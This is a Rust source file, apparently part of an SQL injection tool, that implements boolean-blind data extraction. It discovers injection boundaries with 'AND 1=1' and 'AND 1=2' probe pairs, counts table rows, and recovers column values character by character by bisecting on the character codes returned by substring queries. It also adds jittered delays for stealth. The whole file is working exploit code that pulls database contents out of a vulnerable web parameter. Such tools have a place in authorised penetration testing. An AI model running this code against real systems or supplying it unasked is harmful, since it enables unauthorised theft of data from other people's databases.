//! Boolean-blind data extraction: bisection algorithm for extracting
//! strings and numbers using TRUE/FALSE page-difference oracle.

use std::time::{Duration, Instant};
use anyhow::Result;
use tracing::{debug, info};

use crate::sqx::{
    detector::SqliDetector,
    models::{
        BlindExtractionConfig, BlindExtractionProgress, BlindExtractionResult,
        CancellationToken, ExtractionStatus, HttpResponse,
    },
    payload_fetcher::{BOUNDARIES, DynamicPayloads},
    similarity::calculate_similarity,
};

impl SqliDetector {
    /// Extract data using blind SQL injection (bisection algorithm).
    ///
    /// Extracts data character-by-character using O(log n) requests per char.
    /// If `boundary_hint` is empty, attempts auto-discovery of a working
    /// boundary before starting the bisection.
    pub async fn extract_data_blind(
        &self,
        url: &str,
        param: &str,
        original_value: &str,
        dbms: &str,
        extraction_config: &BlindExtractionConfig,
        baseline: &HttpResponse,
        boundary_hint: Option<&str>,
        payload_id: Option<&str>,
        progress_callback: Option<Box<dyn Fn(BlindExtractionProgress) + Send + Sync>>,
        cancel_token: Option<CancellationToken>,
    ) -> Result<BlindExtractionResult> {
        let start_time = Instant::now();
        let mut total_requests = 0;
        let mut extracted_values = Vec::new();

        let dynamic = DynamicPayloads::load();
        let sqlmap_test = payload_id.and_then(|id| dynamic.tests.iter().find(|t| t.title == id));
        let vector = sqlmap_test.map(|t| t.vector.clone());

        info!(
            "Starting blind data extraction using payload: {}",
            payload_id.unwrap_or("generic")
        );

        if let Some(ref token) = cancel_token
            && token.is_cancelled() {
                return Ok(BlindExtractionResult {
                    extracted_values: vec![],
                    total_requests: 0,
                    extraction_time_secs: 0,
                    technique_used: "Cancelled".to_string(),
                });
            }

        if let Some(ref callback) = progress_callback {
            callback(BlindExtractionProgress {
                current_value_index: 0,
                current_char_index: 0,
                extracted_so_far: String::new(),
                total_requests: 0,
                status: ExtractionStatus::Running,
            });
        }

        let technique = extraction_config.technique;

        // Discover boundary if no hint provided.
        let (close, balance) = if let Some(hint) = boundary_hint {
            if let Some((c, b)) = DynamicPayloads::find_boundary(hint) {
                info!("Using hinted boundary '{}' for blind extraction", hint);
                (c, b)
            } else {
                info!("Boundary hint '{}' not found, attempting discovery", hint);
                self.discover_boundary_blind(url, param, original_value, baseline)
                    .await?
                    .unwrap_or_else(|| ("'".to_string(), "-- ".to_string()))
            }
        } else {
            self.discover_boundary_blind(url, param, original_value, baseline)
                .await?
                .unwrap_or_else(|| {
                    if original_value.parse::<i64>().is_ok() {
                        ("".to_string(), "-- ".to_string())
                    } else {
                        ("'".to_string(), "-- ".to_string())
                    }
                })
        };

        let row_count = self
            .get_row_count_blind(
                url, param, original_value, extraction_config, baseline,
                &close, &balance, vector.as_deref(), &mut total_requests, cancel_token.as_ref(),
            )
            .await?;

        let rows_to_extract = row_count.min(extraction_config.max_rows);
        info!("Found {} rows, extracting {}", row_count, rows_to_extract);

        for row_index in 0..rows_to_extract {
            if let Some(ref token) = cancel_token
                && token.is_cancelled() {
                    info!("Extraction cancelled after {} rows", row_index);
                    break;
                }

            let value = self
                .extract_string_blind(
                    url, param, original_value, dbms, extraction_config, baseline,
                    row_index, &close, &balance, vector.as_deref(), &mut total_requests,
                    progress_callback.as_ref(), cancel_token.as_ref(),
                )
                .await?;

            if !value.is_empty() {
                extracted_values.push(value.clone());
                if let Some(ref callback) = progress_callback {
                    callback(BlindExtractionProgress {
                        current_value_index: row_index + 1,
                        current_char_index: value.len(),
                        extracted_so_far: value,
                        total_requests,
                        status: ExtractionStatus::Running,
                    });
                }
            }
        }

        let elapsed = start_time.elapsed();
        let is_cancelled = cancel_token.as_ref().map(|t| t.is_cancelled()).unwrap_or(false);

        info!(
            "Blind extraction {}: {} values in {} requests ({:?})",
            if is_cancelled { "stopped" } else { "complete" },
            extracted_values.len(),
            total_requests,
            elapsed
        );

        Ok(BlindExtractionResult {
            extracted_values,
            total_requests,
            extraction_time_secs: elapsed.as_secs(),
            technique_used: format!("{:?}", technique),
        })
    }

    /// Attempt to discover a working boundary for blind extraction by sending
    /// TRUE/FALSE pairs across all built-in and dynamic boundaries.
    pub(crate) async fn discover_boundary_blind(
        &self,
        url: &str,
        param: &str,
        original_value: &str,
        baseline: &HttpResponse,
    ) -> Result<Option<(String, String)>> {
        let is_numeric = original_value.parse::<i64>().is_ok();

        for boundary in BOUNDARIES.iter() {
            if !is_numeric && boundary.close.is_empty() { continue; }

            if let Some(result) = self
                .try_boolean_pair_blind(url, param, original_value, baseline, boundary.close, boundary.balance)
                .await
            {
                if result {
                    debug!(
                        "Discovered working boundary for blind extraction: {} ({})",
                        boundary.label, boundary.close
                    );
                    return Ok(Some((
                        boundary.close.to_string(),
                        boundary.balance.to_string(),
                    )));
                }
            }
            tokio::time::sleep(crate::sqx::stealth::jittered_delay(self.config.delay_ms, self.config.stealth.jitter_pct)).await;
        }

        let dynamic = DynamicPayloads::load();
        for b in &dynamic.boundaries {
            if !is_numeric && b.prefix.is_empty() { continue; }

            let prefix = DynamicPayloads::resolve_placeholders(&b.prefix, 42, "sqx", original_value, "1=1", 5);
            let suffix = DynamicPayloads::resolve_placeholders(&b.suffix, 42, "sqx", original_value, "1=1", 5);

            if let Some(result) = self
                .try_boolean_pair_blind(url, param, original_value, baseline, &prefix, &suffix)
                .await
            {
                if result {
                    debug!(
                        "Discovered working dynamic boundary for blind extraction: dyn:{}",
                        b.prefix
                    );
                    return Ok(Some((prefix, suffix)));
                }
            }
            tokio::time::sleep(crate::sqx::stealth::jittered_delay(self.config.delay_ms, self.config.stealth.jitter_pct)).await;
        }

        Ok(None)
    }

    /// Test a single TRUE/FALSE boundary pair for extraction calibration.
    /// Returns `Some(true)` if the boundary produces a clear TRUE/FALSE gap.
    async fn try_boolean_pair_blind(
        &self,
        url: &str,
        param: &str,
        original_value: &str,
        baseline: &HttpResponse,
        close: &str,
        balance: &str,
    ) -> Option<bool> {
        let true_payload  = format!("{}{} AND 1=1 {}",
            original_value, close, balance);
        let false_payload = format!("{}{} AND 1=2 {}",
            original_value, close, balance);

        let true_url  = self.build_test_url(url, param, original_value, &true_payload);
        let true_resp = self.send_request(&true_url).await.ok()?;
        tokio::time::sleep(crate::sqx::stealth::jittered_delay(self.config.delay_ms, self.config.stealth.jitter_pct)).await;

        let false_url  = self.build_test_url(url, param, original_value, &false_payload);
        let false_resp = self.send_request(&false_url).await.ok()?;

        let true_sim  = calculate_similarity(&baseline.body, &true_resp.body);
        let false_sim = calculate_similarity(&baseline.body, &false_resp.body);
        let gap = true_sim - false_sim;

        if true_sim > 0.9 && gap > 0.02 {
            Some(true)
        } else {
            Some(false)
        }
    }

    /// Get row count using boolean blind injection.
    pub(crate) async fn get_row_count_blind(
        &self,
        url: &str,
        param: &str,
        original_value: &str,
        config: &BlindExtractionConfig,
        baseline: &HttpResponse,
        close: &str,
        balance: &str,
        vector: Option<&str>,
        request_count: &mut usize,
        cancel_token: Option<&CancellationToken>,
    ) -> Result<usize> {
        if let Some(token) = cancel_token
            && token.is_cancelled() {
                return Ok(0);
            }

        let query = format!("(SELECT COUNT(*) FROM {})", config.target_table);
        let count = self
            .extract_number_blind(
                url, param, original_value, &query, baseline,
                close, balance, vector, 0, 1000, request_count, cancel_token,
            )
            .await?;

        Ok(count as usize)
    }

    /// Extract a string value character by character using bisection.
    pub(crate) async fn extract_string_blind(
        &self,
        url: &str,
        param: &str,
        original_value: &str,
        dbms: &str,
        config: &BlindExtractionConfig,
        baseline: &HttpResponse,
        row_index: usize,
        close: &str,
        balance: &str,
        vector: Option<&str>,
        request_count: &mut usize,
        progress_callback: Option<&Box<dyn Fn(BlindExtractionProgress) + Send + Sync>>,
        cancel_token: Option<&CancellationToken>,
    ) -> Result<String> {
        let mut result = String::new();

        let subquery = if let Some(ref custom) = config.custom_query {
            format!("({})", custom)
        } else {
            format!(
                "(SELECT {} FROM {}{} LIMIT 1 OFFSET {})",
                config.target_column,
                config.target_table,
                config
                    .where_clause
                    .as_ref()
                    .map(|w| format!(" WHERE {}", w))
                    .unwrap_or_default(),
                row_index
            )
        };

        if let Some(token) = cancel_token
            && token.is_cancelled() {
                return Ok(result);
            }

        let length_query = format!("LENGTH({})", subquery);
        let length = self
            .extract_number_blind(
                url, param, original_value, &length_query, baseline,
                close, balance, vector, 0, config.max_length_per_value as i32, request_count, cancel_token,
            )
            .await?;

        info!("Row {} has length {}", row_index, length);

        for pos in 1..=length {
            if let Some(token) = cancel_token
                && token.is_cancelled() {
                    return Ok(result);
                }

            let dialect_box = crate::sqx::dbms::dialect_by_name(dbms);
            let dialect = dialect_box.as_deref().unwrap_or(&crate::sqx::dbms::major::MySQL);
            let char_query = format!(
                "{}({}({}, {}, 1))",
                dialect.char_code_function(),
                dialect.substring_function(),
                subquery,
                pos
            );
            let ascii_val = self
                .extract_number_blind(
                    url, param, original_value, &char_query, baseline,
                    close, balance, vector, 0, 127, request_count, cancel_token,
                )
                .await?;

            if let Some(ch) = char::from_u32(ascii_val as u32) {
                result.push(ch);
                if let Some(callback) = progress_callback {
                    callback(BlindExtractionProgress {
                        current_value_index: row_index,
                        current_char_index: pos as usize,
                        extracted_so_far: result.clone(),
                        total_requests: *request_count,
                        status: ExtractionStatus::Running,
                    });
                }
            }
        }

        Ok(result)
    }

    /// Extract a number using bisection (binary search).
    pub(crate) async fn extract_number_blind(
        &self,
        url: &str,
        param: &str,
        original_value: &str,
        query: &str,
        baseline: &HttpResponse,
        close: &str,
        balance: &str,
        vector: Option<&str>,
        min_val: i32,
        max_val: i32,
        request_count: &mut usize,
        cancel_token: Option<&CancellationToken>,
    ) -> Result<i32> {
        let mut low = min_val;
        let mut high = max_val;

        while low < high {
            if let Some(token) = cancel_token
                && token.is_cancelled() {
                    return Ok(low);
                }

            let mid = low + (high - low) / 2;

            let condition = format!("{} > {}", query, mid);
            let is_greater = self
                .test_condition_blind(url, param, original_value, &condition, baseline, close, balance, vector)
                .await?;
            *request_count += 1;

            if is_greater {
                low = mid + 1;
            } else {
                high = mid; // value <= mid, so mid is still a candidate
            }

            tokio::time::sleep(crate::sqx::stealth::jittered_delay(self.config.delay_ms, self.config.stealth.jitter_pct)).await;
        }

        Ok(low) // low == high == answer
    }

    /// Test a boolean condition using blind SQL injection.
    pub(crate) async fn test_condition_blind(
        &self,
        url: &str,
        param: &str,
        original_value: &str,
        condition: &str,
        baseline: &HttpResponse,
        close: &str,
        balance: &str,
        vector: Option<&str>,
    ) -> Result<bool> {
        let true_payload = if let Some(v) = vector {
            DynamicPayloads::resolve_placeholders(v, 42, "sqx", original_value, condition, 5)
        } else {
            format!("{}{} AND ({}) {}", original_value, close, condition, balance)
        };

        let test_url = self.build_test_url(url, param, original_value, &true_payload);
        let response = self.send_request(&test_url).await?;

        // Signal 1: status code change is a strong FALSE signal.
        if response.status != baseline.status {
            return Ok(false);
        }

        let similarity = calculate_similarity(&baseline.body, &response.body);

        // Signal 2: clearly different body → FALSE.
        if similarity < 0.5 {
            return Ok(false);
        }

        // Signal 3: if similarity is high but we can't be sure, use differential oracle.
        // Fetch known-TRUE and known-FALSE probes to calibrate.
        // This costs 2 extra requests but is only triggered when similarity > 0.85,
        // which is when the simple threshold would be unreliable.
        if similarity > 0.85 {
            let (known_true_pl, known_false_pl) = if let Some(v) = vector {
                (
                    DynamicPayloads::resolve_placeholders(v, 42, "sqx", original_value, "1=1", 5),
                    DynamicPayloads::resolve_placeholders(v, 42, "sqx", original_value, "1=2", 5),
                )
            } else {
                (
                    format!("{}{} AND 1=1 {}", original_value, close, balance),
                    format!("{}{} AND 1=2 {}", original_value, close, balance),
                )
            };

            let true_url  = self.build_test_url(url, param, original_value, &known_true_pl);
            let false_url = self.build_test_url(url, param, original_value, &known_false_pl);

            let (true_ref, false_ref) = tokio::join!(
                self.send_request(&true_url),
                self.send_request(&false_url),
            );

            if let (Ok(tr), Ok(fr)) = (true_ref, false_ref) {
                let gap = calculate_similarity(&baseline.body, &tr.body)
                    - calculate_similarity(&baseline.body, &fr.body);

                if gap > 0.02 {
                    // The target has a detectable TRUE/FALSE difference.
                    // Classify by proximity: which reference is the probe closer to?
                    let sim_to_true  = calculate_similarity(&tr.body, &response.body);
                    let sim_to_false = calculate_similarity(&fr.body, &response.body);
                    return Ok(sim_to_true >= sim_to_false);
                }

                // gap <= 0.02: current boundary shows no differentiation.
                // Fall through to simple threshold — caller will eventually
                // retry boundary discovery if extraction keeps failing.
            }
        }

        Ok(similarity > 0.9)
    }
}
